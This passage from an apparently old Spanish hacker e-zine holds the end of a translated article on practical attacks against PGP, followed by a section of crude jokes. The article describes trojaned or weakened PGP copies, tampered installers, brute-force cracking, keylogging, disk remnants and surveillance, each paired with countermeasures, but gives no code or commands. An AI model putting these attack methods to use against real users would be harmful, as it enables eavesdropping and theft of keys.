* Rutinas para generación de números aleatorios modificadas para arrojar 
  resultados predecibles. 
* Rutinas de clave de sesión modificadas para que se use siempre la misma clave. 
* Rutinas IDEA, RSA o MD5 debilitadas. 
* Mensajes cifrados siempre con una clave adicional encubierta. 
* La versión debilitada puede introducirse en el ordenador objetivo por medio de: 
* Una aplicación de caballo de Troya que encubiertamente parchea el programa binario. 
* Reemplazar físicamente la copia legítima con una copia debilitada cuando el 
  usuario no se encuentra presente. 
* Hacer pasar la copia debilitada como legítima y distribuirla por Internet 
  (una comprobación reciente con AltaVista reveló varios centenares de direcciones 
  donde se puede descargar pgp262.zip o la versión internacional comparable). 
* Un ataque de "hombre en el medio" donde el blanco descarga el programa que se 
  encuentra en una dirección legítima (p. ej. MIT) pero la sesión es interceptada,
  y la copia del programa es sustituida 
  por otra debilitada. Aunque puedes usar dif o alguna otra utilidad para comparar 
  una aplicación sospechosa con una copia legítima de una  fuente conocida, un 
  ataque más sutil es parchear el código mientras está residente en la RAM con 
  una aplicación troyana separada. 

Aunque las copias, firmadas con PGP, del archivo ejecutable ofrece cierta 
protección contra versiones modificadas, varios investigadores han demostrado 
que se pueden crear claves fraudulentas. Un usuario ignorante de tal hecho 
podría ser potencialmente convencido de que el archivo ejecutable ha sido firmado
por una fuente fiable, cuando en realidad no lo ha sido 



"Instalación"
 
Las versiones tanto comerciales como gratuitas del recientemente aparecido 
PGP 5.0 hace que éste se obtenga mediante un archivo auto-extraible .EXE. 
Resulta bastante trivial añadir un parche para que se instalen programas 
maliciosos en otros lugares, y que sen ejecutados antes de que el .EXE se ejecute. 
Chris Drake, un consultor de seguridad australiano, ha producido varios 
ejemplos de este tipo de ataque en una prueba. Aunque hay una firma asociada 
con el instalador, muy poca gente comprueba la validez de las aplicacione firmadas. 

"Interfaces [shells]" 

La popularidad inicial de PGP fue alimentada por un conjunto de "shells" o 
interfaces basados en Windows que enmascaraban los comandos del DOS, 
difíciles de recordar, con menús y cuadros de diálogo. Un estudio reciente 
encontró más de 30 de estos shells disponibles en Internet como gratuitos 
o de dominio público. 

Los shells ayudaron en la aceptación pública de PGP, pero la mayoría están 
patentados por naturaleza, y muy pocos autores muestran todo el código fuente. 
Los usuarios dependen de la integridad del autor, quien es habitualmente una 
entidad desconocida en algún lugar distante. Las oportunidades para instalar 
puertas traseras, comandos escondidos y fallos son múltiples. Y aunque un 
programador tenga las mejores intenciones, fallos de programación no descubiertos 
pueden comprometer la seguridad del shell. Considera la plétora de agujeros 
de seguridad descubiertos en programas de software comercial. Desafortunadamente, 
el nivel de escrutinio dado a los fallos en los shells es como poco desalentador. 

La vulnerabilidad de los shells será un hecho de la vida en el futuro próximo. 
La versión 5.0 de PGP tiene un interfaz "oficial" para Windows 95 (junto con 
código fuente para la versión gratuita), pero la mayoría de los usuarios de PC 
en todo el mundo siguen usando Windows 3.x y usarán PGP y shells de DOS. 

++Contramedidas++ 

*Desconfía de los "griegos" que llevan regalos. 
*Obtén tu copia de PGP o interfaz de una fuente fiable y conocida. 
*Compila tu propio código fuente de confianza (si tienes la habilidad y el compilador). 
*Valida cuidadosamente todas las firmas. 
*Guarda resúmenes (hash) de tus criptoaplicaciones y compruébalas con regularidad. 


Ataques de fuerza bruta
==================== 

Los ataques mediante fuerza bruta se aprovechan de gente descuidada 
(por usar un calificativo suave) que usa malas frases de contraseña. 
En cierto modo, es como dejar siempre la puerta sin echar la llave. 
Puede que nadie gire nunca el picaporte para ver qué pasa, pero un 
día puede que vuelvas a casa y te la encuentres saqueada. 

PGPCrack es una aplicación de fuerza bruta ampliamente diseminada, 
diseñada para reventar archivos cifrados convencionalmente mediante 
PGP y que ataca la contraseña de la clave secreta. Depende de un archivo 
separado de diccionario, y prueba cada palabra como contraseña potencial. 
En un archivo protegido por PGP mediante cifrado convencional, el programa 
comprueba más de 15.000 palabras por segundo en un Pentium a 100 MHz. 
Como referencia, compárese con las 5.000 a 7.000 palabras/segundo para 
programas típicos de reventado de claves en UNIX en la misma máquina. 

No es descabellado suponer que algunas agencias de seguridad y espionaje 
tengan sus propios programas optimizados para ataques de fuerza bruta 
contra PGP. Seguramente incluye sistemas de hardware muy rápidos y especializados. 

El sentido común debe prevalecer con las contraseñas. Está más allá del
propósito de este trabajo dar consejos sobre cómo seleccionar y usar una 
contraseña fuerte. Si no lo sabe, averígualo. 

++Contramedidas++ 

*Usa contraseñas fuertes. 
*Usa contraseñas compartimentalizadas (esto es, algunas contraseñas para 
 seguridad fuerte como en PGP, otras para seguridad débil como en contraseñas 
 de salvapantallas...); si rotas las contraseñas, nunca mezcles los dos tipos. 


Ataques al sistema operativo 
============================

Desafortunadamente, el entorno operativo más popular usado en todo el mundo 
hoy día es terriblemente inadecuado a efectos de niveles decentes de seguridad. 
La arquitectura de Microsoft Windows 3.x y Windows 95 deja muchas vías de ataque 
para alguien que busque comprometer mensajes con PGP (aunque Windows NT ofrece 
una mejor seguridad, conforme se someta a un escrutinio más intenso aparecen 
más fallos aprovechables). 


"Archivos borrados" 

El usuario medio es deliciosamente ignorante de que, cuando borra un archivo, 
sólo se cambia la información sobre la asignación del archivo, y el contenido 
sigue residiendo en el disco hasta que sea sobreescrito por otro archivo. Hay 
numerosos programas disponibles para recuperar todo o parte del contenido de 
un archivo borrado. 

Si usas PGP para cifrar un archivo y lo borras, o usas un editor para componer
y guardar mensajes de correo electrónico antes de cifrar, estás en peligro. 

Hay también una vulnerabilidad en los archivos temporales borrados. Algunas 
aplicaciones guardan una copia temporal del documento en el que estás trabajando. 
El archivo se borra cuando terminas la sesión de trabajo. 
Puede que ni siquiera estés al tanto de que existe un archivo temporal, pero el 
contenido puede ser visto o recuperado por alguien con acceso a tu disco duro. 

Las utilidades de "tachado" [Wipe] resuelven esta debilidad sobreescribiendo 
un archivo con datos, a veces varias veces, antes del borrado. Esto evita que 
un fisgón use una herramienta de recuperación de datos para recuperar un archivo 
borrado o escudriñar un disco duro en busca de evidencias incriminadoras. 

PGP tiene un parámetro opcional de tachado, pero solamente con una pasada. 
Una sola sobreescritura debería bastar para la mayoría de los casos, pero 
en algunos casos de riesgo extremo se requiere que los datos sean sobreescritos 
al menos tres veces antes de su borrado. 

Nota: algunos expertos han afirmado que los microscopios electrónicos de 
barrido o de efecto túnel pueden ser capaces de recuperar datos sobreescritos 
entre 7 y 9 veces. Sin embargo, debido al coste y a los factores que afectan 
la remanencia magnética fuera de las condiciones de laboratorio, este es un 
ataque improbable. 

++Contramedidas++ 

*No dejes por ahí copias archivos de de texto no cifrado. 
*Usa utilidades de borrado seguro. 
*Ojo a las aplicaciones que usan archivos temporales 
*Destruye físicamente (rasga/quema/pulveriza/mete en ácido) los medios 
 magnéticos viejos [discos duros, disquetes] que contengan datos seguros. 


"Espacio residual [slack space]" 


DOS/Windows asigna espacios de disco en paquetes llamados clusters. 
Por ejemplo, con un tamaño de cluster de 2k, un archivo de 100 bytes 
usa el mismo espacio que un archivo de 2.048 bytes. El espacio residual 
es el espacio que hay entre el final del archivo físico y el final del 
cluster asignado. Si bien una utilidad de borrado seguro sobreescribe el 
archivo físico, los bytes del espacio residual suelen permanecer. 

Esto significa un riesgo, ya que pueden quedar bits y trozos de texto no 
cifrado en un disco duro. Como ejercicio, usa un editor de disco y busca 
en tu disco duro una cadena de texto referente a algo de información privada. 
Es probable que encuentres referencias en clusters no asociados con archivos 
actualmente asignados. Un fisgón puede lanzar un ataque similar de exploración. 

Desfragmentar el disco duro no eliminará los datos almacenados en el espacio 
residual. Tu única opción es usar un programa diseñado para borrar los bytes 
no asignados que se encuentran al final de los clusters. 

++Contramedidas++ 

*Usa programas para el borrado de espacio residual 
- http://www.sky.net/~voyageur/wipeutil.htm [N. del T. otro programa
 eficaz para borrado de espacio residual es BCWipe] 


"Vigilancia del teclado" (KEYLOG)

La principal debilidad de cualquier criptosistema es habitualmente la 
autenticación de la contraseña. Los usuarios suelen cometer muchos errores 
involuntarios al seleccionar y asegurar una contraseña. Sin embargo, las contraseñas
son asimismo extremadamente vulnerables al nivel del sistema operativo. 

Las rutinas de gestión de claves en DOS y Windows pueden ser fácilmente parcheadas 
para capturar las pulsaciones sobre el teclado. Las pulsaciones pueden ser grabadas 
en el disco o transmitidas por una red. Hay numerosas aplicaciones DOS y Windows en 
Internet para el monitoreo de pulsaciones, que podrían usarse para subvertir una 
contraseña de PGP. Con la contraseña revelada, el fisgón solamente necesita una copia 
del archivo de claves secretas. 

++Contramedidas++ 

*Usa aplicaciones diseñadas para evitar la vigilancia del teclado (NetSafe). 
*Guarda resúmenes (hash) cifrados, o firmas, de ficheros clave en el sistema operativo 
 "limpios" para futura referencia. 


"Vulnerabilidades de red" 

Se han identificado diversas debilidades relacionadas con la seguridad en entornos 
de red en Windows 3.x, Windows 95 y Windows NT. No está al alcance del presente 
trabajo discutir estas debilidades en detalle. Como poco, los usuarios deberán estar 
al tanto de que bajo ciertas circunstancias, es posible el acceso encubierto a datos 
mediante las unidades de disco en acceso a redes 

++Contramedidas++ 

*Mantente al día respecto a las vulnerabilidades de red de Windows. 
*Usa archivos Winsock (de los que guardan registro de las actuaciones pasadas) para 
 vigilar las conversaciones en protocolos. 



Ataques por red 
===============

El crecimiento de Internet ha supuesto nuevas amenazas para los usuarios. Los días de 
los PC como estaciones de trabajo monousuario o en pequeñas redes de confianza son 
cosa del pasado. Los ataques remotos lanzados por Internet son ahora una posibilidad 
real. Estos tipos de ataques, ya sea contra individuos o empresas, aumentarán con toda 
seguridad en el futuro. 

"Ataques con virus" 

Virus con fines de espionaje. Diseñados para recoger/robar información. Pueden ser de 
despliegue vertical o horizontal. 

Hay un brillante futuro para los virus "de espionaje". Considera un virus que se extienda 
solamente a máquinas con copia de PGP en su interior. 

++Contramedidas++ 

*Usa programas para comprobación antivirus. 


"Ataques por navegadores y aplicaciones [applets] hostiles" 

Al haberse ido convirtiendo los navegadores en programas clave para los usuarios, hay que 
tener en cuenta los riesgos que subyacen a su naturaleza ubicua. Se ha descubierto 
numerosos fallos de seguridad en los navegadores tanto de Netscape como de Microsoft, 
los cuales permiten el acceso remoto no autorizado al disco duro de un usuario. Varios 
de estos fallos podrían ser explotados contra PGP para: 

*robar un archivo de claves 
*modificar un archivo de claves 
*instalar un caballo de Troya 
*permitir acceso a archivos no cifrados 

Aunque los vendedores sacan parches contra dichos fallos, no todos los usuarios son 
conscientes de que puede haber problemas de seguridad en versiones más antiguas. 

Además de esto, en la vorágine competitiva para sacar al mercado nuevas versiones 
de los navegadores, están mostrando sus feas caras muchos más fallos de los que se 
puedan ver en un producto con un ciclo de desarrollo normal. Cuantos más fallos, más 
posibilidades hay de que uno de ello pueda convertirse en un agujero de seguridad.
(El ambocioso esfuerzo de Microsoft llamado Windows 98, que fusionará el ordenador con 
Internet, significará sin duda mayor vulnerabilidad debido a la naturaleza de la unión 
transparente entre el PC y la red). 

Aparte los riesgos asociados con los fallos de los navegadores, los lenguajes de 
programación como Java, JavaScript y VBScript, así como la arquitectura ActiveX de 
Microsoft permiten una posible vía de entrada a ataques remotos mediante el acceso 
a páginas Web. 

Si bien el modelo de seguridad en Java ofrece teóricamente una barrera para mantener 
las aplicaciones [applets] fuera de los datos del usuario, siguen apareciendo fallos 
de seguridad. ActiveX no ofrece seguridad contra estos tipos de ataques, ya que funciona 
mediante un modelo de confianza basado en firmas, en el que el sentido común del usuario
es la fuerza predominante. 

Aunque la mayoría de la gente se preocupa por páginas Web diseñadas para resultar 
destructivas, no existe mucha información sobre páginas Web diseñadas para espionaje, 
las cuales extraen ocultamente información del disco duro de un usuario. Estas 
"páginas de ataque", pasivas y relativamente difíciles de detectar, pueden acabar 
siendo una amenaza sustancial a la intimidad y seguridad en el futuro. 

Hasta la fecha, no hay contenidos en páginas Web lo bastante atractivos para 
arriesgarse habilitando opciones Java, SavaScript y ActiveX en tu navegador. 

++Contramedidas++ 

*Mantente al día con los últimos parches de tu navegador. 
*No confíes en páginas Web que contengan Java, JavaScript, VBScript o ActiveX 
*Usa una estrategia de "rojo/negro" con dos ordenadores (uno conteniendo información 
 insegura y usado para navegar por la red; el otro con información asegurada y 
 aislado de la ved). 
*Usa Lynx.  




Ataques por vigilancia electrónica 
===================================

Además de los ataques a PGP basados en ordenador, pueden usarse métodos 
tradicionales de vigilancia electrónica para comprometer la seguridad que 
el cifrado suele ofrecer. 

"Vigilancia audio y video" 

Podrían escribirse tomos enteros sobre técnicas de vigilancia y contravigilancia 
electrónica usada por agencias de inteligencia, fuerzas de seguridad y el sector 
privado. Aunque estos métodos quedan fuera del alcance de este trabajo, es importante 
recordar que estos tipos de ataques pueden usarse junto con ataques basados por 
ordenador como los anteriormente descritos, u otros. Algunos ejemplos: 

*Las personas suelen hablar consigo mismas al usar un ordenador. Un micrófono de 
 audio puede revelar la contraseña u otra información. 
*Un teclado estándar puede ser cambiado por un modelo modificado que contenga un 
 transmisor para emitir una señal única para cada tecla pulsada. Pueden enviarse 
 señales de radio a cada pulsación, o almacenadas y enviadas a intervalos aleatorios 
 en una transmisión rápida. 
*Puede incluso usarse vigilancia no electrónica. Se conocen casos de hackers que 
 usaban telescopios para observar monitores de ordenador por las ventanas. Si 
 bien el equipo de vigilancia suele ser caro, hay aparatos de menor precio. 
 Considera que la vigilancia electrónica puede usarse por oponentes que 
 carezcan de la habilidad técnica para montar un ataque basado en ordenador. 

++Contramedidas++ 

*Si el modelo de amenaza lo permite, usa contramedidas técnicas anti-vigilancia (TSCM) 
*No confíes en detectores de micrófonos de los de "tiendas de espías", ya que 
 por lo general solo detectan los tipos más básicos de ingenios de vigilancia 
 (a menos que tengas la experiencia y el equipo adecuados, no podrás detectar 
 aparatos sofisticados de vigilancia). 



"TEMPEST" 


TEMPEST es una palabra código sobre el estudio de las emanaciones electromagnéticas 
y las contramedidas necesarias para evitar la fuga de información. Por ejemplo, 
los monitores de ordenador sueltan emanaciones electromagnéticas. En las 
condiciones correctas y con el equipo técnico adecuado, es posible recrear el 
contenido de la pantalla desde una ubicación remota. Los riesgos de seguridad son obvios. 

A pesar de los esfuerzos de los gobiernos occidentales para mantener la 
información tipo TEMPEST oculta, hay bastante información pública disponible 
(ver http://www.eskimo.com/~joelm/tempest.html). 

Algunos "expertos" pintan un cuadro de furgonetas en cada esquina, rastreando 
las pantallas de los PCs en las ondas. Para la mayoría, la amenaza de vigilancia
 de emanaciones es irrealista. Bajo las condiciones del mundo real, es difícil 
re-crear una pantalla de ordenador capturada. No obstante, si el enemigo tiene acceso 
a recursos cuantiosos y el objetivo tiene alto valor, tales ataques pueden ser viables. 

++Contramedidas++ 

*Usa técnicas y componentes habituales de apantallamiento de radiofrecuencia 
para reducir las fugas electromagnéticas de tu PC, periféricos y cableado. 
*Compra hardware apantallado contra TEMPEST 



Ataques no técnicos 
========================
La tecnología suele verse como una solución mágica a los problemas de seguridad. 
No lo es. El hecho simple es que los ataques que involucran personas en vez de 
tecnología suelen ser más efectivos y económicos. 

Es muy peligroso subestimar el elemento humano. Piensa en: 
*Soborno, amenazas o coerción física sobre amigos, familiares o colegas. 
*Irrupciones y robos, aprobados judicialmente o ilegales. 
*Confianza en la persona equivocada. 

Cualquiera de estas condiciones comprometerá comunicaciones cifradas con PGP 
más deprisa que una bancada de superordenadores Cray. 

++Contramedidas++ 

*Revisa la seguridad física en sus premisas. 
*No escribas tu contraseña. 
*No entres tu contraseña enfrente de otros. 
*Guarda los archivos de claves en un disquete floppy y en lugar seguro. 
*No aceptes caramelos de desconocidos. 
*No confíes en nadie. 

Conclusión 
==============

Defenderte contra ataques prácticos a PGP es factible si tienes en cuenta 
algunas contramedidas. 

*¿Cuál es tu modelo de amenazas? Esto debe dictarte tus contramedidas. 
*Usa una estrategia de "rojo/negro" 
*No seas tonto con tu contraseña 
*No ejecutes PGP en una red 
*Usa SFS, SecureDrive, SecureDisk, BestCrypt, F-Secure, etc. 
*Guarda resúmenes MD5 o firmas PGP de archivos "limpios" de PGP y del 
 sistema operativo, y compruébalos periódicamente. 
*Usa programas antivirus 
*Guarda los archivos de claves en un disquete (cifrado convencionalmente) 
*Borra archivos y espacio residual de modo seguro 
*Destruye físicamente (pulveriza/quema/machaca) discos viejos que tengan 
 datos de interés 
*Vigila los registros Winsock de TCP-IP 
*Desactiva las opciones Java, JavaScript y ActiveX en tu navegador 
*No te olvides de la seguridad física 
*Ten cuidado en quién confías 
*Obtén tu copia de PGP de una fuente fiable 
*Líbrate de Windows y usa Linux con CFS 



Joel McNamara (joelm@eskimo.com)


http://www.eskimo.com/~joelm/pgpatk.html   Documento original en ingles 
http://www.ugr.es/~aquiran/cripto/expedien/exped004.htm Documento 
traducido por Arturo Quirantes .

Para buscar amas informacion de PGP y criptografia en español , 
Revisa la pagina de Arturo Quirantes :aquiran@goliat.ugr.es
http://www.ugr.es/~aquiran/ 

ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ


       
			  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       		  #								 #
                    #  6.- Chistes , Cuentos y otras Burradas      #
			  #								 #
  			  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



_________________________________________________________________________ By Varios

Bueno esta seccion se alimenta principalmente de la lista de correo de Nustro amigo
Charlie Gomez desde Colombia ... Gracias Charlie !!!!



 EL NUEVO AUTOMOVIL MICROSOFT 95
===============================

 Buenas noticias: Microsoft ha lanzado a la venta  un automovil
 ultramoderno.Funciona de la siguiente manera:
 
1.     - Usted introduce las llaves y aprieta el botón de encendido.   
Los vidrios del parabrisas se oscurecen automáticamente y usted no
puede ver nada. No se preocupe. Usted no necesita ver nada. El auto
Microsoft vera el camino por usted.
 
2.     - El motor comienza a calentarse. En el monitor del  panel
aparece la siguiente leyenda: "Inicializando... espere, por favor." Pasan
cuatro minutos. Aparece una nueva leyenda: "Combustible, OK. Neumáticos, OK.
Ventilación, OK. Tubo de escape, OK. Cinturones de seguridad, OK.
Apague el cigarrillo, por favor".
 
3.     - Tres minutos mas tarde, otra leyenda: "El sistema de
autodiagnóstico  ha descubierto que usted ha cambiado recientemente el
filtro del aceite. Espere mientras el  sistema se reinstala.Mientras
tanto, puede usted registrar su nuevo filtro de aceite enviando un
e-mail  al fabricante: para hacerlo así, haga click en el icono
correspondiente ". Usted llena su formulario, registra su nuevo filtro
y envía el mensaje. Pasan cuatro minutos. Aparece un nuevo mensaje
en el monitor: "Error de sistema.  Se ha detectado una incompatibilidad
en el modulo  00 33 44 789 235. Haga el favor de apagar todo y vuelva a
encender la maquina después de quince  segundos".
 
4.     - Usted sigue las instrucciones y luego de un breve proceso de
quince minutos el auto se pone en marcha.  Pronto aparece en el
monitor un mensaje: "Hemos llegado a un cruce. Haga click en la opción que 
prefiere: Giro a la Derecha - Giro a la Izquierda - Seguir en línea recta - 
Retroceder al punto de partida -  Apagar la maquina". Usted   hace
click en su opción,  y aparece un mensaje en el monitor: "Usted ha
optado  por girar a la Derecha. Esta seguro? - Si - No ". Usted
indica que si. El auto gira a la derecha.
 
5.     - Inmediatamente aparece un mensaje en el monitor:
"Insuficiente reserva de combustible. Apague su maquina, por favor y póngase en
contacto con su  proveedor de gasolina". Usted apaga la maquina y  activa
un programa de diagnostico que le informa:  "En el tanque de gasolina
tiene usted 252 litros de combustible". Usted activa otro programa
especial de "Ayuda", que le explica: "Aunque haya  mucha gasolina
en el tanque, el sistema le dirá que no tiene suficiente cada vez que
usted haya hecho operaciones que implican un gasto  virtual, aunque no
haya hecho un gasto real. Para evitar este inconveniente, usted tiene
tres opciones: 

a) Comprar una nueva versión operativa  del sistema; 

b)Continuar con la versión actual,  pero desactivando la función de
autodiagnóstico.  Esta ultima opción funciona bastante bien, pero 
el auto le funcionara como un Ford T y usted deberá encenderlo con
manivela; 

c) Comprar un  doble tanque de combustible, con capacidad para 999 litros.
Debe ser de marca Microsoft y debe llenarse con gasolina Microsoft de octanaje 95".
 
6.     - Después de pensarlo un rato, usted se decide  por la primera
opción, y a través de su módem, que todavía le funciona (no es
Microsoft), compra la nueva versión operativa y procede a su
instalación. Esto le lleva unas dos o tres horas,  porque a cada   
momento aparecen mensajes como este: "El programa de instalación ha
detectado que la rutina para el manejo de los frenos que  usted ya tiene   
instalada es mejor que la que trata de instalar ahora. Quiere Usted
remplazarla con la nueva o dejar la vieja? Le recomendamos que conserve la
vieja".
 
7.     - Luego de instalar la nueva versión operativa,  usted constata
que ha conservado las viejas rutinas de frenos, dirección, escape,
control de aceite,  velocímetro, medidor de distancias, barómetro, reloj
automático, carburador, alarmas, limpiavidrios,  aire acondicionado,
refrigeración del motor y control  de aire en los neumáticos. Lo único
que ha instalado ha sido el nuevo numero de licencia y el tipo
 
8.     - Lleno de esperanza en el progreso, usted enciende  ahora su
maquina dispuesto a llegar al trabajo, aunque sea para marcar la tarjeta de
salida. En el  monitor aparece de inmediato un mensaje: "Lo sentimos,   
el sistema operativo que usted esta usando  no funciona en la maquina
que usted tiene. Por favor, modernice su hardware. Esta maquina se
apagara ahora automáticamente".
 
  9.     - Mientras usted ha estado haciendo todo lo  anterior, en
medio de la vía, han pasado raudamente a su lado tres automóviles MacIntosh 
(los únicos tres que hay activos en el mercado,  porque la empresa no ha
podido vender mas).  Al parecer funcionan bien, pero esa es otra
historia  que aquí no tiene importancia. También han pasado setecientas
ochenta y tres carretas tiradas por burros,  catorce mil seiscientos
noventa y un automóviles de manejo manual, anticuados, y unas
cuantas docenas  de automóviles Windows 3.11, que van a tropezones  pero
van. Usted maldice su perra suerte, maldice la vida, maldice los
inspectores de transito que ya  le han puesto ocho multas por estorbar el
trafico de vehículos... pero mira orgulloso a los peatones que lo observan,   
muertos de la envidia, porque usted  es el feliz propietario de un
fantástico automóvil Microsoft 95, maravilla de la técnica y símbolo
universal del genio tecnológico moderno. Y este privilegio sublime bien  merece
ser pagado con algunas minúsculas incomodidades.
 
 


LA COCA COLA NUESTRA DE CADA DIA
===============================

Se apersonan altos funcionarios de Coca Cola ante Su 
Santidad en el Vaticano para hacerle una propuesta:
 
Su Santidad, le ofrecemos US$5.000.000 mensuales para que se 
cambie en el Padre Nuestro la frase "El pan nuestro de cada 
día ..." por "La Coca Cola nuestra de cada día.."
 
A lo que el Santo Padre responde: "No podemos hacer eso Hijo Mío.."
 
Tras unos meses vuelven a visitar el Vaticano con otra 
propuesta: Su Santidad nuestra empresa le ofrece 
US$300.000.000 anuales para cambiar en el Padre Nuestro la 
frase "El pan nuestro de cada día ..." por "La Coca Cola 
nuestra de cada día.."
 
A lo que el Santo Padre responde: "de ninguna manera podemos 
hacer eso Hijo Mío..."
 
Insistentes estos funcionarios, consiguen una cita con el 
Sumo Pontífice, y le presentan una oferta de su Corporación:
Su Santidad nuestra empresa ha decidido ofrecerle a su 
Iglesia la cantidad de  US$1.500.000.000 anuales para que se 
cambie en el Padre Nuestro la frase "El pan nuestro de cada 
día ..." por "La Coca Cola nuestra de cada día..."
 
A lo que el Santo Padre, voltea hacia su Secretario y le 
pregunta: "¿En que fecha termina nuestro contrato con los 
panaderos...?
 
 

 
FORMAS DE PENSAR
=================

En la clase de matemáticas, pregunta la señorita a sus 
pequeños pupilos...
 
-" A ver niños, hay tres pajaritos sentados en una rama, un 
cazador dispara y cae uno de ellos, ¿cuántos quedan en la 
rama?"
 
- "Ninguno", responde Jaimito después de pensarlo 
detenidamente...
 
- "NO, no, Jaimito"... responde la maestra confundida... 
levanta los tres dedos y repite "...baja uno, cuantos 
quedan???"...
 
- "Ninguno", insiste Jaimito autoritariamente. "Los otros 
pajaritos se asuntan y no queda ninguno en la rama...".
 
- "Excelente, Jaimito... no es muy matemático pero me gusta 
tu forma de pensar!"
 
El niño, a su vez consulta con la maestra... "Hay tres 
señoritas con helados en la mano sentadas en un banco del 
parque. La una chupa el helado, la otra muerde el helado y 
la tercera lo lame lentamente... ¿cuál de ellas está casada?"
 
La maestra lo mira como si no entiende, y Jaimito repite 
insistentemente...: "una lo muerde, otra lo chupa, otra lo 
lame... ¿cuál es la casada?".
 
Tímidamente la señorita responde "la que chupa..."
"No, No..." dice Jaimito... "la que tiene el aro de 
matrimonio en el dedo, pero ME GUSTA SU FORMA DE PENSAR..." 
 


SOR RITA
========

Había una vez una chica que desde pequeña soñaba con ser 
monja,  y un día decide irse a un convento para cumplir su 
sueño.
 
Allí estuvo  mas de 9 años dedicándose a tomar sus votos, 
hasta que llega el día esperado de casarse definitivamente 
con Jesucristo es entonces cuando son bautizadas con su 
nuevo nombre:
 
Madre Superiora: Tu hija te llamaras María, SOR María, tu 
hija te llamaras Teresa, SOR Teresa y cuando le toca a la 
muchacha en cuestión le dice: TU te llamaras Rita, SOR Rita.
Es en este momento que la muchacha rompe en llanto por que 
decía que como una monjita se llamaría ZORRITA (SOR RITA) y 
decide enviar al Vaticano una carta donde hacia la petición 
de cambio de nombre, al cabo de los meses le envían el 
pasaje y todo lo necesario para ir a cambiarse el nombre, y 
llega al Vaticano...
 
Padre: Hija te hemos dado la oportunidad, pero debes saber 
que este nuevo nombre que tomes de la caja será el 
definitivo, NO HAY VUELTA ATRAS!!!
 
Sor Rita: Si padre, estoy segura que no habrá nada peor que 
llamarse ZORRITA
 
Padre: OK, toma un nombre y encomiéndate a Jesús.
Sor Rita toma el papelito y sin leerlo se lo da al Padre.
 
Padre: Hija Te llamaras RAIMUNDA
 
 



LA MUERTE DE CLINTON Y EL PAPA
=============================
 
El Presidente Clinton y el Papa mueren el mismo día y debido 
a un problema administrativo, mandan a Clinton al cielo y al 
Papa al infierno.
 
El Papa explica la situación al diablo, el revisa todos los 
papeles y se da cuenta del error. Sin embargo, el diablo le 
explica al Papa que tomará 24 horas arreglar el problema y 
corregir el error. Al día siguiente el Papa es despedido por 
el diablo y se dirige rumbo al cielo. Mientras subía se 
encuentra con Clinton, quien venia bajando y se paran a 
conversar.
 
 
Papa: Lamento la confusión
 
Clinton: No hay problema
 
 
Papa: Estoy muy emocionado. He esperado con ansias el 
momento de ir al cielo.
 
Clinton: ¿Y eso por qué?
Papa: Toda mi vida he querido conocer a la Virgen María
 
Clinton: Lo siento, llegas un día tarde.
 


FIDEL Y EL PAPA CAEN AL MAR
=========================
 
Cuentan que durante la reciente visita del Papa a Cuba, 
Fidel invita al Papa a dar una vuelta en una balsa y se caen 
al mar. Fidel no se hunde sino que camina sobre el agua y le 
da la mano al Papa y lo salva.
 
En el Vaticano la noticia es que Fidel hizo un milagro
 
En el Gramma de Cuba dicen que Fidel es Dios
 
"En Miami declaran que Fidel no sabe nadar".
 


 EL DEDO EN LA SOPA
==================
 
Un hombre entra a un restaurante y pide al camarero que le 
traiga una sopa; al poco tiempo viene el camarero con la 
sopa y a la vez traía el dedo gordo metido en la sopa.
 
Cuando el cliente se da cuenta, le dice al camarero:
-Que bonito, se fijó que trae el dedo gordo metido en
la sopa, no cabrón?
  
 El camarero le dice:

-Lo que pasa es que me pico una avispa y el médico me dijo 
 que tuviera el dedo metido en algo caliente
 
 A lo que el cliente con arrechera, le dice:
 
-¿Por que no te lo metes en el culo?;
 
 El camarero le responde:
 
- Precisamente eso es lo que hago entre plato y plato 



FAQ?
====

1. Por que los kamikazes llevaban casco?
2. Por que venden tabaco en las gasolineras,si esta prohibido fumar ?
3. Adan y Eva, tenian ombligos?
4. Si los Seven Eleven estan abiertos 24 horas al dia, 365 dias al 
anho,entonces porque las puertas tienen cerrojo?
5. Si nada se pega al teflon, como lo pegaron a la sarten ?
6. Si Superman es tan listo, entonces por que lleva los calzoncillos 
por fuera ?
7. Es peligroso masturbarse debajo de una manta electrica ?
8. Como saben los ciegos cuando han acabado de limpiarse el culo?
9. Cuando te haces una foto al lado de Mickey Mouse, el hombre de 
dentro del disfraz esta sonriendo ?
10. Por que bragas es plural y sujetador es singular ?
11. Por que en los anuncios de raquetas de tenis aparece gente jugando 
al tenis, en los anuncios de coches puedes ver 12. coches, y sin 
embargo en los anuncios de condones no ves mas que gente jugando al 
tenis o coches parados?
13. Por que no hacen los aviones con el mismo material que usan para 
hacer la caja negra ?
14. Por que cuando llueve levantamos los hombros ? ? Acaso nos mojamos 
menos ?
15. Por que cuando conduces buscando un sitio para aparcar bajas el 
volumen de la radio? ?Acaso vas a ver mejor ?
16. El otro dia oi que las esponjas crecen en el mar. Hasta donde 
llegaria el agua si no fuese por ellas ?
17. Si estamos compuestos en un 80% de agua, como podemos ahogarnos?
18. Se dice que solo diez personas en todo el mundo entendian a 
Einstein.?Si nadie me entiende a mi, soy un genio?
19. Si los vegetarianos comen vegetales, que comen los humanitarios ?
20. Si carcel y prision son sinonimos, porque no lo son carcelero y 
prisionero ?
21. Si una palabra estuviese mal escrita en el diccionario, como lo 
sabriamos ?
22. Por que en los Estados Unidos te hace falta el carnet de conducir 
para comprar alcohol, si esta prohibido beber y conducir ?
23. Los caballos tienen sobacos ?
24. Cuando un coche esta circulando, el aire dentro de las ruedas esta 
girando ?
25. El otro dia compre agua en polvo. Pero como la preparo ?
26. Si los banqueros pueden contar, porque en los bancos hay ocho 
ventanillas y solo cuatro cajeros ?
27. Si un gato cae siempre de pie, y una tostada con mantequilla cae 
siempre por el lado en que esta untada, que pasaria si le atas un  gato 
en la espalda una tostada con la mantequilla hacia arriba y luego lo 
tiras al aire ?
28. De que color es un camaleon mirandose en un espejo?
29 En caso de guerra nuclear, los pulsos electromagneticos de las 
bombas termonucleares podrian danar mis videocassettes?
30. Que pasaria si un hermano siames fuese declarado culpable de un 
asesinato y condenado a muerte en la silla electrica?
